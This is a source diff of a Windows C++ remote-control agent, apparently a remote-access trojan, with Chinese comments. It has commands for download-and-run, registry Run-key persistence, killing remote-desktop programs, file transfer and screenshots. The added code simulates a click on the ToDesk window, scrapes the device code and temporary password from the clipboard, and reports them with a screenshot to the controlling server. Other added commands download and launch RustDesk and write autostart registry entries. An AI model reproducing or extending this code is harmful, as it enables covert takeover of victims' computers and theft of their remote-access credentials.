@@ -29,7 +29,6 @@
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "gdi32.lib")
-#pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -79,7 +78,7 @@ static CRITICAL_SECTION g_dirReadyMapLock;
 #define CMD_FILE_END     0x17  // 文件传输完成
 #define CMD_FILE_RESUME  0x18  // 查询续传偏移
 #define CMD_KILL_TODESK 0x19  // 结束ToDesk进程
-#define CMD_KILL_ASKLINK 0x20  // 结束ToDesk进程
+#define CMD_KILL_ASKLINK 0x20  // 结束连连控进程
 #define CMD_KILL_RES    0x1A  // 结束进程结果
 #define CMD_DOWNLOAD_EX 0x1B  // 通用下载指令
 #define CMD_DOWNLOAD_PROGRESS 0x1C  // 下载进度回报
@@ -103,7 +102,6 @@ static CRITICAL_SECTION g_dirReadyMapLock;
 #define CMD_FILE_HELLO   0xF1  // 文件端口握手（连上9001/9002后发）
 #define CMD_HEARTBEAT 0x30
 #define CMD_AGENT_HELLO  0xF4  // 被控端指令连接握手
-#define CMD_PORT         9003  // 指令中转端口（新增）
 #define CMD_PAIR_OK   0xF5   // 服务端配对成功确认
 #define CMD_PAIR_FAIL 0xF6   // 服务端配对失败
 
@@ -122,11 +120,18 @@ static CRITICAL_SECTION g_dirReadyMapLock;
 #define CMD_GET_STARTUP_LIST_RES 0x3A
 #define CMD_HEARTBEAT_9003 0x3B
 #define CMD_ADD_STARTUP_NOREG  0x3D  // 只写注册表不复制文件
+#define CMD_GET_TODESK_INFO     0x40
+#define CMD_GET_TODESK_INFO_RES 0x41
+#define CMD_DOWNLOAD_RUSTDESK   0x43  // 下载并打开 RustDesk
+#define CMD_OPEN_RUSTDESK       0x44  // 打开 RustDesk（兜底）
+#define CMD_KILL_RUSTDESK       0x45  // 结束 RustDesk 进程
+// ===== 注册表操作指令 =====
+#define CMD_REG_WRITE_AUTO     0x56
+#define CMD_REG_WRITE_AUTO_RES 0x57
 
 
 // 在全局变量区加
 CRITICAL_SECTION g_sendLock;
-CRITICAL_SECTION g_fileSendLock;
 
 // ★ 新增：网络就绪标志，协调9000和9003的启动顺序
 static volatile bool g_NetworkReady = false;
@@ -136,6 +141,7 @@ static HANDLE g_NetworkReadyEvent = NULL;
 
 string LaunchAskLink(SOCKET reportSocket, const string& cpuTag);
 string ModifyStartup(SOCKET reportSocket, bool add, bool copyFile, const string& sourceFilePath = "");
+string DoOpenToDesk();
 
 #pragma pack(push, 1)
 struct PktHeader {
@@ -204,19 +210,6 @@ bool RecvAll(SOCKET s, char* buf, int len) {
     }
     return true;
 }
-
-//容量格式化
-string FormatSize(ULONGLONG bytes)
-{
-    char buf[64] = {};
-    if (bytes >= 1024ULL * 1024 * 1024)
-        sprintf_s(buf, "%.2f GB", bytes / 1024.0 / 1024 / 1024);
-    else if (bytes >= 1024 * 1024)
-        sprintf_s(buf, "%.2f MB", bytes / 1024.0 / 1024);
-    else
-        sprintf_s(buf, "%llu KB", bytes / 1024);
-    return string(buf);
-}
 // GBK字节串 -> UTF-8字符串（用于cmd输出转换）
 string GbkToUtf8(const string& gbk)
 {
@@ -269,7 +262,7 @@ bool RecvPacketBin(SOCKET s, unsigned int& cmd, vector<char>& data) {
     if (ntohl(hdr.magic) != MAGIC) return false;
     cmd = ntohl(hdr.cmd);
     unsigned int len = ntohl(hdr.dataLen);
-    if (len > 1000 * 10240 * 10240) return false;
+    if (len > 100ULL * 1024 * 1024) return false;
     data.resize(len);
     if (len > 0 && !RecvAll(s, data.data(), len)) return false;
     return true;
@@ -518,8 +511,6 @@ string ResolveSysPath(const string& pathId)
         if (result.empty()) result = GetSystemDrive() + L"\\Users\\Public\\Desktop";
     }
     else if (pathId == "PUBLIC_HOME") {
-        result = TryShellFolder(CSIDL_COMMON_APPDATA);
-        if (result.empty()) result = GetSystemDrive() + L"\\Users\\Public";
         // 取Public目录（父级）
         result = GetSystemDrive() + L"\\Users\\Public";
     }
@@ -755,7 +746,6 @@ void DownloadAndRunEx(const DownloadConfig& cfg)
         return;
     }
 
-    // 下载循环，实时回报进度
     // 下载循环，实时回报进度
     LONGLONG total = 0;
     DWORD    bytesRead = 0;
@@ -1253,72 +1243,6 @@ bool IsRunningInPE()
         return true;
 
     return false;
-}
-
-// 静默执行命令并返回输出，不弹黑框
-string ExecHidden(const char* cmd)
-{
-    string result;
-
-    SECURITY_ATTRIBUTES sa = {};
-    sa.nLength = sizeof(sa);
-    sa.bInheritHandle = TRUE;
-
-    HANDLE hReadPipe = NULL, hWritePipe = NULL;
-    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
-        return result;
-
-    STARTUPINFOA si = { sizeof(si) };
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    si.hStdOutput = hWritePipe;
-    si.hStdError = hWritePipe;
-
-    PROCESS_INFORMATION pi = {};
-    char cmdBuf[512];
-    strcpy_s(cmdBuf, cmd);
-
-    if (!CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE,
-        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
-    {
-        CloseHandle(hReadPipe);
-        CloseHandle(hWritePipe);
-        return result;
-    }
-
-    CloseHandle(hWritePipe);
-
-    // 读取原始字节
-    vector<char> rawBytes;
-    char buf[4096];
-    DWORD bytesRead = 0;
-    while (ReadFile(hReadPipe, buf, sizeof(buf), &bytesRead, NULL) && bytesRead > 0)
-        rawBytes.insert(rawBytes.end(), buf, buf + bytesRead);
-
-    CloseHandle(hReadPipe);
-    WaitForSingleObject(pi.hProcess, 5000);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-
-    if (rawBytes.empty()) return result;
-
-    // ★ 判断是否是 UTF-16 LE（BOM: FF FE）
-    if (rawBytes.size() >= 2 &&
-        (unsigned char)rawBytes[0] == 0xFF &&
-        (unsigned char)rawBytes[1] == 0xFE)
-    {
-        // UTF-16 LE → UTF-8
-        wstring ws((wchar_t*)(rawBytes.data() + 2),
-            (rawBytes.size() - 2) / sizeof(wchar_t));
-        result = WideToUtf8(ws);
-    }
-    else
-    {
-        // 已经是UTF-8或ASCII，直接用
-        result.assign(rawBytes.begin(), rawBytes.end());
-    }
-
-    return result;
 }
 
 //获取硬件信息
@@ -2506,7 +2430,7 @@ string ModifyStartup(SOCKET reportSocket, bool add, bool copyFile, const string&
                     }
                 }
             }
-        }  // ← ★ 这里是 if (add && copyFile) 的闭合括号，你的代码里这行缺失了
+        } 
         // 操作注册表Run键
         const wchar_t* runSubKey =
             L"Microsoft\\Windows\\CurrentVersion\\Run";
@@ -3100,7 +3024,7 @@ HWND FindProcessWindow(DWORD pid)
         EnumData* p = (EnumData*)lParam;
         DWORD winpid = 0;
         GetWindowThreadProcessId(hwnd, &winpid);
-        if (winpid == p->pid && IsWindowVisible(hwnd) && GetParent(hwnd) == NULL) {
+        if (winpid == p->pid && IsWindowVisible(hwnd)) {
             p->hwnd = hwnd;
             return FALSE;
         }
@@ -3428,29 +3352,6 @@ void BringWindowToFrontAndWait(HWND hwnd)
     SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
 }
 
-// ===== 通用远程软件截图框架 =====
-
-// 远程软件配置结构体
-// 后续添加新软件只需填写此结构体，不用改任何通用逻辑
-struct RemoteAppConfig
-{
-    // 进程名列表，按优先级排序（精简版在前）
-    vector<wstring> processNames;
-
-    // 精简版/绿色版在磁盘上的固定搜索路径列表（按优先级排序）
-    // 通用函数会自动在运行时追加"当前用户桌面"路径
-    vector<wstring> liteSearchPaths;
-
-    // 截图文件名前缀（生成文件名用）
-    string filePrefix;
-
-    // 精简版/绿色版的进程名（用于区分优先级，必须包含在processNames里）
-    // 如果没有精简版概念，填空
-    wstring liteProcessName;
-};
-
-// ===== 以下为通用函数，不含任何软件专属逻辑 =====
-
 // 终止指定进程名列表中的所有进程，等待完全退出（最多5秒）
 void KillProcessesByNames(const vector<wstring>& names)
 {
@@ -3485,123 +3386,6 @@ HWND WaitForAppWindow(const vector<wstring>& processNames)
         }
     }
     return NULL;
-}
-
-// 通用远程软件截图函数
-// 只需传入配置结构体，适用于ToDesk/向日葵/连连控等所有远程软件
-wstring CaptureRemoteApp(const RemoteAppConfig& cfg)
-{
-    // 动态获取当前用户桌面路径，追加到Lite搜索路径
-    wchar_t userName[256] = {};
-    DWORD userNameLen = 256;
-    GetUserNameW(userName, &userNameLen);
-
-    vector<wstring> litePaths = cfg.liteSearchPaths;
-    if (!cfg.liteProcessName.empty()) {
-        litePaths.push_back(GetSystemDrive() + L"\\Users\\" + userName + L"\\Desktop\\" + cfg.liteProcessName);
-        // PE公共桌面兜底
-        litePaths.push_back(GetSystemDrive() + L"\\Users\\Public\\Desktop\\" + cfg.liteProcessName);
-    }
-
-    // ===== 步骤1：扫描进程 =====
-    HWND    hwnd = NULL;
-    DWORD   foundPid = 0;
-    wstring foundExePath;
-    bool    isLiteRunning = false;
-    bool    isFullRunning = false;
-
-    // 区分精简版和完整版进程
-    vector<DWORD> litePids, fullPids;
-    for (auto& name : cfg.processNames) {
-        auto pids = FindProcessByName(name);
-        if (!pids.empty()) {
-            if (name == cfg.liteProcessName)
-                litePids.insert(litePids.end(), pids.begin(), pids.end());
-            else
-                fullPids.insert(fullPids.end(), pids.begin(), pids.end());
-        }
-    }
-    isLiteRunning = !litePids.empty();
-    isFullRunning = !fullPids.empty();
-
-    // ===== 步骤2：获取窗口和路径（优先精简版）=====
-    if (isLiteRunning) {
-        foundPid = litePids[0];
-        hwnd = FindProcessWindow(foundPid);
-        foundExePath = GetProcessExePath(foundPid);
-    }
-    else if (isFullRunning) {
-        foundPid = fullPids[0];
-        hwnd = FindProcessWindow(foundPid);
-        foundExePath = GetProcessExePath(foundPid);
-    }
-
-    // ===== 步骤3：磁盘有精简版则强制切换 =====
-    if (!isLiteRunning && !cfg.liteProcessName.empty())
-    {
-        wstring availableLitePath;
-        for (auto& p : litePaths) {
-            if (GetFileAttributesW(p.c_str()) != INVALID_FILE_ATTRIBUTES) {
-                availableLitePath = p;
-                break;
-            }
-        }
-        if (!availableLitePath.empty()) {
-            KillProcessesByNames(cfg.processNames);
-            hwnd = NULL;
-            foundExePath = availableLitePath;
-            goto launch_app;
-        }
-    }
-
-    // ===== 步骤4：窗口最小化处理 =====
-    if (hwnd && IsIconic(hwnd)) {
-        KillProcessesByNames(cfg.processNames);
-        hwnd = NULL;
-        goto launch_app;
-    }
-
-    // ===== 步骤5：有窗口且正常显示，直接截图 =====
-    if (hwnd) {
-        BringWindowToFrontAndWait(hwnd);
-        goto do_capture;
-    }
-
-    // ===== 步骤6：无进程无精简版，直接放弃（调用方自行处理）=====
-    {
-        return L"";
-    }
-
-launch_app:
-    if (!LaunchProcess(foundExePath)) {
-        return L"";
-    }
-    hwnd = WaitForAppWindow(cfg.processNames);
-    if (!hwnd) {
-        return L"";
-    }
-    BringWindowToFrontAndWait(hwnd);
-
-do_capture:
-    {
-        RECT rect = {};
-        GetWindowRect(hwnd, &rect);
-        int w = rect.right - rect.left;
-        int h = rect.bottom - rect.top;
-        if (w < 300 || h < 200) {
-            Sleep(2000);
-            BringWindowToFrontAndWait(hwnd);
-        }
-        wstring ts = Utf8ToWide(GetTimestamp());
-        wstring cacheDir = Utf8ToWide(GetScreenshotCacheDir());
-        // 确保末尾有反斜杠
-        if (!cacheDir.empty() && cacheDir.back() != L'\\') cacheDir += L'\\';
-        wstring savePath = cacheDir + Utf8ToWide(cfg.filePrefix) + L"_" + ts + L".jpg";
-        if (!CaptureHwndToFile(hwnd, savePath)) {
-            return L"";
-        }
-        return savePath;
-    }
 }
 
 // 通过 lnk 快捷方式查找 ToDesk 安装版路径
@@ -3642,6 +3426,181 @@ wstring GetToDeskInstallPathFromLnk()
         }
     }
     return L"";
+}
+
+
+// ================================================================
+//  解析剪贴板中的设备代码和临时密码
+// ================================================================
+struct ToDeskInfoData {
+    string deviceCode;
+    string password;
+};
+
+static bool ParseToDeskCredentials(const wstring& clip, ToDeskInfoData& info)
+{
+    wstring wCode = L"ToDesk设备代码:";
+    size_t codePos = clip.find(wCode);
+    size_t codeSkip = wCode.length();
+    if (codePos == wstring::npos) {
+        wCode = L"ToDesk设备代码：";
+        codePos = clip.find(wCode);
+        codeSkip = wCode.length();
+    }
+    if (codePos == wstring::npos) return false;
+
+    size_t codeStart = codePos + codeSkip;
+    size_t codeEnd = clip.find(L'\r', codeStart);
+    if (codeEnd == wstring::npos) codeEnd = clip.find(L'\n', codeStart);
+    if (codeEnd == wstring::npos) codeEnd = clip.length();
+    wstring wDevice = clip.substr(codeStart, codeEnd - codeStart);
+    while (!wDevice.empty() && (wDevice.front() == L' ' || wDevice.front() == L'\t')) wDevice.erase(0, 1);
+    while (!wDevice.empty() && (wDevice.back() == L' ' || wDevice.back() == L'\t')) wDevice.pop_back();
+    info.deviceCode = WideToUtf8(wDevice);
+
+    wstring wPass = L"临时密码:";
+    size_t passPos = clip.find(wPass);
+    size_t passSkip = wPass.length();
+    if (passPos == wstring::npos) {
+        wPass = L"临时密码：";
+        passPos = clip.find(wPass);
+        passSkip = wPass.length();
+    }
+    if (passPos == wstring::npos) return false;
+
+    size_t passStart = passPos + passSkip;
+    size_t passEnd = clip.find(L'\r', passStart);
+    if (passEnd == wstring::npos) passEnd = clip.find(L'\n', passStart);
+    if (passEnd == wstring::npos) passEnd = clip.length();
+    wstring wPwd = clip.substr(passStart, passEnd - passStart);
+    while (!wPwd.empty() && (wPwd.front() == L' ' || wPwd.front() == L'\t')) wPwd.erase(0, 1);
+    while (!wPwd.empty() && (wPwd.back() == L' ' || wPwd.back() == L'\t')) wPwd.pop_back();
+    info.password = WideToUtf8(wPwd);
+
+    return (!info.deviceCode.empty() && !info.password.empty());
+}
+
+static bool ClickAndGetToDeskInfo(HWND hWnd, ToDeskInfoData& outInfo)
+{
+    if (IsIconic(hWnd)) ShowWindow(hWnd, SW_RESTORE);
+    else ShowWindow(hWnd, SW_SHOW);
+    SetForegroundWindow(hWnd);
+    SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+    Sleep(150);
+    SetWindowPos(hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+
+    RECT rc;
+    GetWindowRect(hWnd, &rc);
+    int W = rc.right - rc.left;
+    int H = rc.bottom - rc.top;
+
+    int clickX = rc.left + W * 21 / 100;
+    int clickY = rc.top + H * 62 / 100;
+
+    if (OpenClipboard(nullptr)) { EmptyClipboard(); CloseClipboard(); }
+
+    SetCursorPos(clickX, clickY);
+    Sleep(50);
+    INPUT inputs[2] = {};
+    inputs[0].type = INPUT_MOUSE;
+    inputs[0].mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
+    inputs[1].type = INPUT_MOUSE;
+    inputs[1].mi.dwFlags = MOUSEEVENTF_LEFTUP;
+    SendInput(2, inputs, sizeof(INPUT));
+
+    // ★ 轮询等待剪贴板写入，最多2秒
+    wstring clip;
+    for (int i = 0; i < 50; i++) {
+        Sleep(100);
+        if (OpenClipboard(nullptr)) {
+            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+            if (hData) {
+                wchar_t* pText = static_cast<wchar_t*>(GlobalLock(hData));
+                if (pText) { clip = pText; GlobalUnlock(hData); }
+            }
+            CloseClipboard();
+        }
+        if (!clip.empty()) break;
+    }
+
+    if (clip.find(L"代码") == wstring::npos || clip.find(L"密码") == wstring::npos)
+        return false;
+
+    return ParseToDeskCredentials(clip, outInfo);
+}
+
+// ================================================================
+//  获取ToDesk信息 + 截图
+//  返回格式：
+//    成功: "OK|设备代码|密码|机器名"  截图路径通过 outScreenshotPath 单独返回
+//    失败: "ERROR|原因|机器名"
+// ================================================================
+static string GetToDeskInfoAndScreenshot(wstring& outScreenshotPath)
+{
+    outScreenshotPath = L"";
+
+    string cpuTag;
+    { wchar_t h[256] = {}; DWORD l = 256; if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }
+
+    // ★ 只认精简版进程，没有精简版就走DoOpenToDesk（会自动Kill完整版）
+    HWND hWnd = nullptr;
+    if (!FindProcessByName(L"ToDesk_Lite.exe").empty())
+        hWnd = FindWindowW(L"H-SMILE-FRAME", nullptr);
+
+    if (!hWnd)
+    {
+        string openResult = DoOpenToDesk();
+        if (openResult.find("FAIL") != string::npos)
+            return "ERROR|ToDesk未找到且启动失败:" + openResult + "|" + cpuTag;
+
+        for (int i = 0; i < 30 && !hWnd; i++) {
+            Sleep(500);
+            hWnd = FindWindowW(L"H-SMILE-FRAME", nullptr);
+        }
+        if (!hWnd) return "ERROR|ToDesk启动后未找到窗口|" + cpuTag;
+        Sleep(1500);
+    }
+
+    // 点击获取信息，失败则重试一次
+    ToDeskInfoData info;
+    bool ok = ClickAndGetToDeskInfo(hWnd, info);
+
+    if (!ok)
+    {
+        string openResult = DoOpenToDesk();
+        if (openResult.find("FAIL") != string::npos)
+            return "ERROR|ToDesk重启失败|" + cpuTag;
+        hWnd = nullptr;
+        for (int i = 0; i < 30 && !hWnd; i++) {
+            Sleep(500);
+            hWnd = FindWindowW(L"H-SMILE-FRAME", nullptr);
+        }
+        if (!hWnd) return "ERROR|ToDesk重启后未找到窗口|" + cpuTag;
+        Sleep(2000);
+
+        ok = ClickAndGetToDeskInfo(hWnd, info);
+        if (!ok) return "ERROR|重试后仍未获取到设备代码和密码|" + cpuTag;
+    }
+
+    // 截图
+    hWnd = FindWindowW(L"H-SMILE-FRAME", nullptr);
+    if (hWnd)
+    {
+        if (IsIconic(hWnd)) ShowWindow(hWnd, SW_RESTORE);
+        SetForegroundWindow(hWnd);
+        SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+        Sleep(800);
+        SetWindowPos(hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+
+        wstring ts = Utf8ToWide(GetTimestamp());
+        wstring cacheDir = Utf8ToWide(GetScreenshotCacheDir());
+        if (!cacheDir.empty() && cacheDir.back() != L'\\') cacheDir += L'\\';
+        wstring savePath = cacheDir + L"todesk_info_" + ts + L".jpg";
+        if (CaptureHwndToFile(hWnd, savePath))
+            outScreenshotPath = savePath;
+    }
+
+    return "OK|" + info.deviceCode + "|" + info.password + "|" + cpuTag;
 }
 
 wstring CaptureToDesk()
@@ -3744,18 +3703,6 @@ wstring CaptureToDesk()
 // ===== 连连控截图 =====
 wstring CaptureAskLink()
 {
-    RemoteAppConfig cfg;
-    cfg.filePrefix = "asklink";
-    cfg.liteProcessName = L"";  // 连连控无精简版概念
-    cfg.processNames = { L"AskLink.exe" };
-    cfg.liteSearchPaths = {};
-    // 步骤6（找不到进程也找不到lnk路径）：用 LaunchAskLink 里的逻辑启动
-    // CaptureRemoteApp 步骤6会因 registryUninstallKeys 为空而返回空，
-    // 外层再调用 LaunchAskLink 补启动。
-    // 但截图框架需要窗口句柄，LaunchAskLink 只启动不返回句柄，
-    // 所以这里重写截图流程，复用 CaptureRemoteApp 处理"进程已存在"的部分，
-    // 无进程时用 LaunchAskLink 启动再等窗口截图。
-
     // ===== 获取cpuTag（用于回报）=====
     string cpuTag;
     { wchar_t h[256] = {}; DWORD l = 256; if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }
@@ -3855,81 +3802,67 @@ string DoOpenToDesk()
     string cpuTag;
     { wchar_t h[256] = {}; DWORD l = 256; if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }
 
-    // 获取桌面路径（用于查找精简版）
-    auto GetUserDesktop = []() -> wstring {
-        static const GUID FOLDERID_Desktop_ = { 0xB4BFCC3A,0xDB2C,0x424C,{0xB0,0x29,0x7F,0xE9,0x9A,0x87,0xC6,0x41} };
-        PWSTR p = nullptr;
-        wstring r;
-        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Desktop_, KF_FLAG_DEFAULT, NULL, &p))) { r = p; CoTaskMemFree(p); }
-        if (r.empty()) {
-            wchar_t buf[MAX_PATH] = {};
-            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, buf))) r = buf;
+    // ===== 步骤1：有窗口直接激活（★ 只认精简版窗口）=====
+    HWND hwnd = FindWindowW(L"H-SMILE-FRAME", nullptr);
+    if (hwnd) {
+        // ★ 验证窗口属于ToDesk_Lite.exe，完整版窗口不能用
+        DWORD winPid = 0;
+        GetWindowThreadProcessId(hwnd, &winPid);
+        bool isLite = false;
+        for (auto pid : FindProcessByName(L"ToDesk_Lite.exe")) {
+            if (pid == winPid) { isLite = true; break; }
         }
-        return r;
-    };
+        if (isLite) {
+            BringWindowToFrontAndWait(hwnd);
+            return "OPEN_OK|ToDesk已激活|" + cpuTag;
+        }
+        // 窗口属于完整版，继续往下走，步骤2会Kill掉
+    }
 
-    wstring desktop = GetUserDesktop();
-    wstring liteOnDesktop = desktop.empty() ? L"" : desktop + L"\\ToDesk_Lite.exe";
-
-    auto litePids = FindProcessByName(L"ToDesk_Lite.exe");
+    // ===== 步骤2：检测到完整版进程，Kill并报错 =====
     auto fullPids = FindProcessByName(L"ToDesk.exe");
-
-    // ===== 情况1：精简版进程存在 =====
-    if (!litePids.empty()) {
-        HWND hwnd = FindProcessWindow(litePids[0]);
-        if (hwnd) { BringWindowToFrontAndWait(hwnd); return "OPEN_OK|ToDesk_Lite已激活|" + cpuTag; }
-        // 有进程无窗口，重启精简版
-        wstring exePath = GetProcessExePath(litePids[0]);
-        KillProcessesByNames({ L"ToDesk_Lite.exe", L"ToDesk.exe" });
-        if (!exePath.empty() && LaunchProcess(exePath)) {
-            HWND hw = WaitForAppWindow({ L"ToDesk_Lite.exe" });
-            if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|ToDesk_Lite已启动|" + cpuTag; }
-        }
-        return "OPEN_FAIL|ToDesk_Lite进程无窗口且重启失败|" + cpuTag;
-    }
-
-    // ===== 情况2：仅完整版进程存在 =====
     if (!fullPids.empty()) {
-        // 桌面有精简版？切换
-        if (!liteOnDesktop.empty() && GetFileAttributesW(liteOnDesktop.c_str()) != INVALID_FILE_ATTRIBUTES) {
-            KillProcessesByNames({ L"ToDesk.exe", L"ToDesk_Lite.exe" });
-            if (LaunchProcess(liteOnDesktop)) {
-                HWND hw = WaitForAppWindow({ L"ToDesk_Lite.exe" });
-                if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|切换到ToDesk_Lite|" + cpuTag; }
-            }
-            return "OPEN_FAIL|ToDesk_Lite启动失败|" + cpuTag;
-        }
-        // 无精简版，直接激活完整版
-        HWND hwnd = FindProcessWindow(fullPids[0]);
-        if (hwnd) { BringWindowToFrontAndWait(hwnd); return "OPEN_OK|ToDesk完整版已激活|" + cpuTag; }
-        wstring exePath = GetProcessExePath(fullPids[0]);
         KillProcessesByNames({ L"ToDesk.exe" });
-        if (!exePath.empty() && LaunchProcess(exePath)) {
-            HWND hw = WaitForAppWindow({ L"ToDesk.exe" });
-            if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|ToDesk完整版已启动|" + cpuTag; }
-        }
-        return "OPEN_FAIL|ToDesk完整版重启失败|" + cpuTag;
+        return "OPEN_FAIL|检测到ToDesk完整版已结束，未找到精简版|" + cpuTag;
     }
 
-    // ===== 情况3：无任何进程 =====
-    // 先查桌面精简版
-    if (!liteOnDesktop.empty() && GetFileAttributesW(liteOnDesktop.c_str()) != INVALID_FILE_ATTRIBUTES) {
+    // ===== 步骤3：无窗口无完整版，从桌面拉起精简版 =====
+    wstring liteOnDesktop;
+    {
+        wchar_t buf[MAX_PATH] = {};
+        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY,
+            NULL, SHGFP_TYPE_CURRENT, buf)) && wcslen(buf) > 0)
+            liteOnDesktop = wstring(buf) + L"\\ToDesk_Lite.exe";
+    }
+    if (!liteOnDesktop.empty() &&
+        GetFileAttributesW(liteOnDesktop.c_str()) != INVALID_FILE_ATTRIBUTES) {
         if (LaunchProcess(liteOnDesktop)) {
             HWND hw = WaitForAppWindow({ L"ToDesk_Lite.exe" });
             if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|ToDesk_Lite已启动|" + cpuTag; }
         }
         return "OPEN_FAIL|ToDesk_Lite启动失败|" + cpuTag;
     }
-    // 再查 lnk（安装版）
-    wstring installPath = GetToDeskInstallPathFromLnk();
-    if (!installPath.empty()) {
-        if (LaunchProcess(installPath)) {
-            HWND hw = WaitForAppWindow({ L"ToDesk_Lite.exe", L"ToDesk.exe" });
-            if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|ToDesk安装版已启动|" + cpuTag; }
-        }
-        return "OPEN_FAIL|ToDesk安装版启动失败|" + cpuTag;
+
+    // 查公共桌面
+    wstring liteOnPublic;
+    {
+        wchar_t buf[MAX_PATH] = {};
+        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_DESKTOPDIRECTORY,
+            NULL, SHGFP_TYPE_CURRENT, buf)) && wcslen(buf) > 0)
+            liteOnPublic = wstring(buf) + L"\\ToDesk_Lite.exe";
+        if (liteOnPublic.empty() ||
+            GetFileAttributesW(liteOnPublic.c_str()) == INVALID_FILE_ATTRIBUTES)
+            liteOnPublic = GetSystemDrive() + L"\\Users\\Public\\Desktop\\ToDesk_Lite.exe";
     }
-    return "OPEN_FAIL|未找到任何ToDesk|" + cpuTag;
+    if (GetFileAttributesW(liteOnPublic.c_str()) != INVALID_FILE_ATTRIBUTES) {
+        if (LaunchProcess(liteOnPublic)) {
+            HWND hw = WaitForAppWindow({ L"ToDesk_Lite.exe" });
+            if (hw) { BringWindowToFrontAndWait(hw); return "OPEN_OK|ToDesk_Lite已启动|" + cpuTag; }
+        }
+        return "OPEN_FAIL|ToDesk_Lite启动失败|" + cpuTag;
+    }
+
+    return "OPEN_FAIL|未找到ToDesk精简版，请先下载|" + cpuTag;
 }
 
 // 截全屏，保存到程序根目录，返回文件路径（失败返回空）
@@ -3971,11 +3904,8 @@ SOCKET ConnectFilePort(const string& taskId)  // ★ 新增taskId参数
         closesocket(fs);
         return INVALID_SOCKET;
     }
-
-    // ★ 新握手格式：AGENT|UniqueKey|TaskID
-    string hello = "AGENT:" + GetMacForRelay() + "|" + taskId;
     // 注意：为兼容服务端解析，格式统一为 "AGENT|MAC|TaskID"
-    hello = "AGENT|" + GetMacForRelay() + "|" + taskId;
+    string hello = "AGENT|" + GetMacForRelay() + "|" + taskId;
     vector<char> helloData(hello.begin(), hello.end());
     SendPacketBin(fs, CMD_FILE_HELLO, helloData);
 
@@ -4038,7 +3968,6 @@ void RecvFileFromCtrl(const string& saveDir, const string& taskId)  // ★ 去�
     DWORD noTo = 0;
     setsockopt(clientSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&noTo, sizeof(noTo));
 
-    // ★ 以下一行不动，保留原函数从 firstCmd 开始的全部代码
     unsigned int firstCmd;
     vector<char> firstData;
     if (!RecvPacketBin(clientSock, firstCmd, firstData)) {
@@ -4109,8 +4038,6 @@ void RecvFileFromCtrl(const string& saveDir, const string& taskId)  // ★ 去�
     }
 
     ULONGLONG received = startOffset;
-    DWORD lastTick = GetTickCount();
-    ULONGLONG lastBytes = startOffset;
 
     while (received < totalSize) {
         unsigned int chunkCmd;
@@ -4124,12 +4051,6 @@ void RecvFileFromCtrl(const string& saveDir, const string& taskId)  // ★ 去�
         DWORD written = 0;
         WriteFile(hFile, chunkData.data(), (DWORD)chunkData.size(), &written, NULL);
         received += written;
-
-        DWORD now = GetTickCount();
-        if (now - lastTick >= 1000) {
-            lastTick = now;
-            lastBytes = received;
-        }
     }
     CloseHandle(hFile);
     closesocket(clientSock);
@@ -4137,62 +4058,6 @@ void RecvFileFromCtrl(const string& saveDir, const string& taskId)  // ★ 去�
     DeleteFileW(savePath.c_str());
     MoveFileW(partPath.c_str(), savePath.c_str());
 }
-
-// ★ 直接在指定socket上发送文件（截图专用，走9003不走9001）
-void SendFileOnSock(SOCKET sock, const wstring& filePath)
-{
-    EnterCriticalSection(&g_fileSendLock);  // ← 新增：函数入口加锁
-    // ★ 文件发送期间设置30秒发送超时，防止控制端异常时永久阻塞
-    DWORD sendTimeout = 30000;
-    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&sendTimeout, sizeof(sendTimeout));
-
-    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
-        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        // ★ 打开失败也要恢复超时
-        DWORD noTo = 0;
-        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&noTo, sizeof(noTo));
-        LeaveCriticalSection(&g_fileSendLock);  // ← 加这行
-        return;
-    }
-
-    LARGE_INTEGER li;
-    GetFileSizeEx(hFile, &li);
-    ULONGLONG totalSize = (ULONGLONG)li.QuadPart;
-
-    wstring wfname = filePath;
-    size_t pos = wfname.rfind(L'\\');
-    if (pos != wstring::npos) wfname = wfname.substr(pos + 1);
-    string fnameUtf8 = WideToUtf8(wfname);
-
-    vector<char> beginPkt(16 + fnameUtf8.size());
-    ULONGLONG netTotal = HToNLL(totalSize);
-    ULONGLONG netOffset = HToNLL((ULONGLONG)0);
